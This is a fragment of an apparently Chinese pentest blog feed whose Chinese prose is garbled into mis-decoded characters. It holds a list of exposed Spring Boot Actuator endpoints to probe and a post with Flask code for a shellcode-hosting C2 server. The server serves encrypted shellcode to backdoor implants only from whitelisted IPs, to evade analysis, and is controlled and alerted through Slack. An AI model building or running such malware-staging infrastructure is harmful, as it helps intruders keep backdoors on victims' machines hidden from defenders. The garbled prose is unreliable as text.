   &amp;lt;exclusions&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;æ²¡æœ‰å¼€å¯å®‰å…¨è®¾ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &amp;#39;*&amp;#39;
      base-path: &amp;#x2F;auto&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥æ”¹å˜Actuatorçš„æ ¹è·¯å¾„ï¼š&lt;code&gt;management.endpoints.web.base-path=/monitor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;  æœç´¢githubçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„è®¾ç½®ï¼š&lt;/p&gt;
&lt;h3 id=&quot;0x02-æ¼æ´åˆ©ç”¨&quot;&gt;&lt;a href=&quot;#0x02-æ¼æ´åˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;0x02 æ¼æ´åˆ©ç”¨&quot;&gt;&lt;/a&gt;0x02 æ¼æ´åˆ©ç”¨&lt;/h3&gt;&lt;p&gt;åœ¨é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½æš´éœ²ä»¥ä¸‹è·¯ç”±:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;#x2F;actuator
&amp;#x2F;auditevents
&amp;#x2F;autoconfig
&amp;#x2F;beans
&amp;#x2F;caches
&amp;#x2F;conditions
&amp;#x2F;configprops
&amp;#x2F;docs
&amp;#x2F;dump
&amp;#x2F;env
&amp;#x2F;flyway
&amp;#x2F;health
&amp;#x2F;heapdump
&amp;#x2F;httptrace
&amp;#x2F;info
&amp;#x2F;intergrationgraph
&amp;#x2F;jolokia
&amp;#x2F;logfile
&amp;#x2F;loggers
&amp;#x2F;liquibase
&amp;#x2F;metrics
&amp;#x2F;mappings
&amp;#x2F;prometheus
&amp;#x2F;refresh
&amp;#x2F;scheduledtasks
&amp;#x2F;sessions
&amp;#x2F;shutdown
&amp;#x2F;trace
&amp;#x2F;threaddump
&amp;#x2F;actuator&amp;#x2F;auditevents
&amp;#x2F;actuator&amp;#x2F;beans
&amp;#x2F;actuator&amp;#x2F;health
&amp;#x2F;actuator&amp;#x2F;conditions
&amp;#x2F;actuator&amp;#x2F;configprops
&amp;#x2F;actuator&amp;#x2F;env
&amp;#x2F;actuator&amp;#x2F;info
&amp;#x2F;actuator&amp;#x2F;loggers
&amp;#x2F;actuator&amp;#x2F;heapdump
&amp;#x2F;actuator&amp;#x2F;threaddump
&amp;#x2F;actuator&amp;#x2F;metrics
&amp;#x2F;actuator&amp;#x2F;scheduledtasks
&amp;#x2F;actuator&amp;#x2F;httptrace
&amp;#x2F;actuator&amp;#x2F;mappings
&amp;#x2F;actuator&amp;#x2F;jolokia
&amp;#x2F;actuator&amp;#x2F;hystrix.stream&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>é˜²å¾¡æ€§C2ç©å…·å°è¯•</title>
    <link href="https://jkme.github.io/2021/04/06/defense-from-c2.html"/>
    <id>https://jkme.github.io/2021/04/06/defense-from-c2.html</id>
    <published>2021-04-05T16:00:00.000Z</published>
    <updated>2022-01-21T02:45:42.671Z</updated>
    
    <content type="html"><![CDATA[<h3 id="èƒŒæ™¯éœ€æ±‚"><a href="#èƒŒæ™¯éœ€æ±‚" class="headerlink" title="èƒŒæ™¯éœ€æ±‚"></a>èƒŒæ™¯éœ€æ±‚</h3><p>ä¸ç®¡ä¸€ä¸ªä»€ä¹ˆå½¢å¼çš„åé—¨ï¼šå®šæ—¶ä»»åŠ¡ã€dllåŠ«æŒã€å¼€æœºå¯åŠ¨â€¦ï¼Œå½“æˆ‘è®¾ç½®çš„åé—¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æƒ³æŒæ¡åé—¨çš„å¯åŠ¨æ—¶é—´ã€è§¦å‘IPç­‰ä¸Šç¯å¢ƒï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æ˜¯åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šåšäº†å°è¯•æ€§æ‰©å±•</p><h4 id="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"><a href="#è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š" class="headerlink" title="è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š"></a>è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š</h4><ul><li>åé—¨è¢«é™æ€åˆ†æ</li><li>åé—¨è¢«åŠ¨æ€åˆ†æ</li><li>shellcodeè¢«æå–ä¹‹åè§¦å‘</li><li>â€¦</li></ul><p>åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šæ‰©å±•è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¿œç¨‹shellcodeæ‰˜ç®¡æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åå‘èµ·ä¸€ä¸ªä¸Šçº¿é€šçŸ¥ï¼šIf This Then Thatï¼Œè¿™æ ·å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬å†å¤šåŠ ç‚¹æ–™ï¼Œæ¯”å¦‚ï¼š</p><ol><li>ä¸å¸¦åˆç†å‚æ•°è¯·æ±‚shellcodeçš„URLæ—¶å€™ï¼Œå‘èµ·è­¦å‘Š</li><li>å½“æœ¨é©¬è¿è¡Œåœ¨æ¶æ„ç¯å¢ƒçš„æ—¶å€™ï¼Œå‘èµ·è­¦å‘Š<ul><li>å½“æœ¨é©¬ä¸Šçº¿IPä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li><li>å½“æœ¨é©¬ä¸Šçº¿ä¸»æœºçš„è®¾å¤‡æŒ‡çº¹ä¸åœ¨æœåŠ¡ç«¯åˆ—è¡¨</li></ul></li><li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥å…³é—­æ‰“å¼€</li><li>shellcodeæ‰˜ç®¡æœåŠ¡éšæ—¶å¯ä»¥æ–°å¢åˆ é™¤æœ¨é©¬ä¸Šçº¿IPæˆ–è€…è®¾å¤‡æŒ‡çº¹</li></ol><h3 id="å‡†å¤‡ææ–™"><a href="#å‡†å¤‡ææ–™" class="headerlink" title="å‡†å¤‡ææ–™"></a>å‡†å¤‡ææ–™</h3><ul><li>ä¸€å°VPSï¼šæ‰˜ç®¡shellcodeï¼Œé€šçŸ¥slackæœºå™¨äºº</li><li>ä¸€ä¸ªAWSè´¦å·éšè—C2ï¼ˆCloudFrontï¼‰</li><li>Slackï¼šæ¥æ”¶é€šçŸ¥ï¼Œä½¿ç”¨<code>Slash commands</code>åŠŸèƒ½æ§åˆ¶shellcodeæ‰˜ç®¡æœåŠ¡</li></ul><h5 id="æ‰˜ç®¡shellcodeæµç¨‹"><a href="#æ‰˜ç®¡shellcodeæµç¨‹" class="headerlink" title="æ‰˜ç®¡shellcodeæµç¨‹"></a>æ‰˜ç®¡shellcodeæµç¨‹</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p><h5 id="Slacké€šçŸ¥"><a href="#Slacké€šçŸ¥" class="headerlink" title="Slacké€šçŸ¥"></a>Slacké€šçŸ¥</h5><p><img src="/2021/04/06/defense-from-c2/slack.png"></p><h5 id="Slash-Command"><a href="#Slash-Command" class="headerlink" title="Slash Command"></a>Slash Command</h5><p><img src="/2021/04/06/defense-from-c2/9.png"></p><p>è¿™ä¸ªç‚¹æ˜¯ä»TGä¸Šç¤¾å·¥åº“è·‘è·¯å¾—æ¥çš„æ€è·¯ï¼Œå½“æ‰§è¡Œä»»ä½•ä¸€ä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œéƒ½ä¼šå‘èµ·ä¸€ä¸ªè¯·æ±‚åˆ°VPSï¼Œç„¶åVPSå¤„ç†è¯·æ±‚ã€‚<br>åœ¨slacké‡Œé¢å¢åŠ <code>slach commands</code>:</p><ul><li><code>/boot</code> å¼€å¯shellcodeæ‰˜ç®¡æœåŠ¡</li><li><code>/delete</code> åˆ é™¤IPç™½åå•ï¼Œ<code>/delete ip 127.0.0.1</code> </li><li><code>/info</code> è·å–æ‰˜ç®¡shellcodeæœåŠ¡å™¨çš„çŠ¶æ€</li><li><code>/add</code> å¢åŠ IPç™½åå•ï¼Œ<code>/add ip 127.0.0.1</code></li><li><code>/shutdown</code> å…³é—­shellcodeæ‰˜ç®¡æœåŠ¡å™¨</li></ul><p>å¤§æ¦‚æµç¨‹æ˜¯è¿™æ ·ï¼ŒIPç™½åå•ç›´æ¥ä½¿ç”¨redisæ¥å­˜å‚¨ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªIPä¸º<code>*</code>çš„æ—¶å€™ï¼Œä»»ä½•IPéƒ½èƒ½ä¸Šçº¿ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/curd'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@verify_check</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span>    text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>    l <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Command is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Text is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"db status &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"/add"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ip"</span><span class="token punctuation">:</span>            redis<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            msg <span class="token operator">=</span> set_msg<span class="token punctuation">(</span><span class="token string">"å¢åŠ  &#123;&#125;æˆåŠŸ, çŠ¶æ€: &#123;&#125;\nå½“å‰æ•°æ®åº“: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            robot<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>verify_check</code>æ˜¯éªŒè¯è¯·æ±‚æ˜¯å¦ä»slackå‘èµ·çš„ï¼Œå®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">verify_check</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># https://api.slack.com/authentication/verifying-requests-from-slack</span>            <span class="token comment"># https://slack.dev/python-slack-sdk/oauth/index.html#app-installation-flow</span>            <span class="token comment"># if request.form and request.form['token'] == "":</span>            slack_signing_secret <span class="token operator">=</span> <span class="token string">'secret'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            timestamp <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Request-Timestamp'</span><span class="token punctuation">]</span>            request_body <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token comment"># print("request data &#123;&#125;".format(request.get_data()))</span>            <span class="token comment"># print(request.values)</span>            <span class="token comment"># request_body = urlencode(request.values)</span>            <span class="token comment"># print("request data is &#123;&#125;".format(request_body))</span>            sig_basestring <span class="token operator">=</span> <span class="token string">'v0:'</span> <span class="token operator">+</span> timestamp <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> request_body            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">float</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>            my_signature <span class="token operator">=</span> <span class="token string">'v0='</span> <span class="token operator">+</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>                slack_signing_secret<span class="token punctuation">,</span>                sig_basestring<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                hashlib<span class="token punctuation">.</span>sha256            <span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            slack_signature <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Slack-Signature'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span>            <span class="token keyword">if</span> hmac<span class="token punctuation">.</span>compare_digest<span class="token punctuation">(</span>my_signature<span class="token punctuation">,</span> slack_signature<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"Resource not found"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="shellcodeæ‰˜ç®¡ä¼ªä»£ç "><a href="#shellcodeæ‰˜ç®¡ä¼ªä»£ç " class="headerlink" title="shellcodeæ‰˜ç®¡ä¼ªä»£ç "></a>shellcodeæ‰˜ç®¡ä¼ªä»£ç </h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/i-am-unreachable'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment"># é™æ€åˆ†æè­¦å‘Š</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">not</span> post_validate<span class="token punctuation">(</span>v<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> request_data <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        user_agent <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span>        method <span class="token operator">=</span> request<span class="token punctuation">.</span>method        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># å¼€å…³å…³é—­çŠ¶æ€</span>        msg_fail<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">,</span> <span class="token string">"æœåŠ¡å™¨æ‰˜ç®¡å¼€å…³å…³é—­ï¼Œæ‰“å¼€è¯·å‘é€æŒ‡ä»¤: **/boot**"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> not_found<span class="token punctuation">(</span><span class="token punctuation">)</span>    ip_str <span class="token operator">=</span> <span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">(</span>ip_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        shell_str <span class="token operator">=</span> <span class="token string">"shell_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>server<span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span>now<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> user<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> c2_info<span class="token punctuation">)</span>        encrypt <span class="token operator">=</span> encrypt_shell<span class="token punctuation">(</span>key<span class="token punctuation">,</span> redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_str<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>encrypt<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é—ç•™é—®é¢˜"><a href="#é—ç•™é—®é¢˜" class="headerlink" title="é—ç•™é—®é¢˜"></a>é—ç•™é—®é¢˜</h3><ol><li>æˆ‘ç›´æ¥é€‰æ‹©IPä½œä¸ºç™½åå•ï¼Œå½“IPåœ¨ç™½åå•ï¼Œå¹¶ä¸”shellcodeæ‰˜ç®¡å¼€å…³æ‰“å¼€çš„æ—¶å€™ï¼Œå‘é€shellcodeã€‚æ·±å…¥ä¸€ç‚¹å¯ä»¥ä½¿ç”¨Machine Keyä½œä¸ºåˆ¤æ–­å†³ç­–ï¼Œæ¯”å¦‚<code>HKLM\SOFTWARE\Microsoft\Cryptography</code>ï¼Œåœ¨æœ¨é©¬åˆæ¬¡è¿è¡Œçš„æ—¶å€™å‘é€Keyåˆ°æœåŠ¡ç«¯ï¼Œä¹‹åæ¯æ¬¡è¿è¡Œçš„æ—¶å€™éƒ½æ£€æµ‹æ˜¯å¦åœ¨æœåŠ¡ç«¯çš„åå•é‡Œé¢ã€‚</li><li>dllå¯ä»¥ä½¿ç”¨socketåˆ†ç¦»shellcodeï¼Œæ€è·¯å’Œä¸Šé¢ä¸€æ ·ã€‚socketæœåŠ¡å™¨çš„éšè—å¯ä»¥é€‰æ‹©AWSçš„ELB(<del>æœ‰ç‚¹è´µ</del>)ç±»ä¼¼çš„åŠ é€ŸæœåŠ¡</li></ol><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://idiotc4t.com/persistence/zhu-ji-te-zheng-bang-ding-mu-ma">ä¸»æœºç‰¹å¾ç»‘å®šæœ¨é©¬</a></li><li><a href="https://github.com/i-saint/scribble/blob/8318bd26adfcb8f26ed8c428e43769d48e75bfbc/MachineGUID.cpp">Github MachineGuid</a></li><li><a href="https://github.com/captainwong/jlib/blob/0b41c6deaa2acaf1642d9b54f6ebd2944f114f13/jlib/win32/DeviceUniqueIdentifier.h">Github DeviceUniqueIdentifier</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;èƒŒæ™¯éœ€æ±‚&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯éœ€æ±‚&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯éœ€æ±‚&quot;&gt;&lt;/a&gt;èƒŒæ™¯éœ€æ±‚&lt;/h3&gt;&lt;p&gt;ä¸ç®¡ä¸€ä¸ªä»€ä¹ˆå½¢å¼çš„åé—¨ï¼šå®šæ—¶ä»»åŠ¡ã€dllåŠ«æŒã€å¼€æœºå¯åŠ¨â€¦ï¼Œå½“æˆ‘è®¾ç½®çš„åé—¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æƒ³æŒæ¡åé—¨çš„å¯åŠ¨æ—¶é—´ã€è§¦å‘IPç­‰ä¸Šç¯å¢ƒï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æ˜¯åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šåšäº†å°è¯•æ€§æ‰©å±•&lt;/p&gt;
&lt;h4 id=&quot;è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&quot;&gt;&lt;a href=&quot;#è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&quot;&gt;&lt;/a&gt;è€ƒè™‘è¿™æ ·çš„åœºæ™¯ï¼š&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;åé—¨è¢«é™æ€åˆ†æ&lt;/li&gt;
&lt;li&gt;åé—¨è¢«åŠ¨æ€åˆ†æ&lt;/li&gt;
&lt;li&gt;shellcodeè¢«æå–ä¹‹åè§¦å‘&lt;/li&gt;
&lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨shellcodeåˆ†ç¦»å…æ€çš„åŸºç¡€ä¸Šæ‰©å±•è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¿œç¨‹shellcodeæ‰˜ç®¡æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæœºå™¨äººï¼Œç„¶åå‘èµ·ä¸€ä¸ªä¸Šçº¿é€šçŸ¥ï¼šIf This Then Thatï¼Œè¿™æ ·å¤ªç®€å•äº†ï¼Œæˆ‘ä»¬å†å¤šåŠ ç‚¹æ–™ï¼Œæ¯”å¦‚ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸å¸¦åˆç†å‚æ•°è¯·æ±‚shellcodeçš„URLæ—¶å€™ï¼Œå‘èµ·è­¦å‘Š&lt;/li&gt;
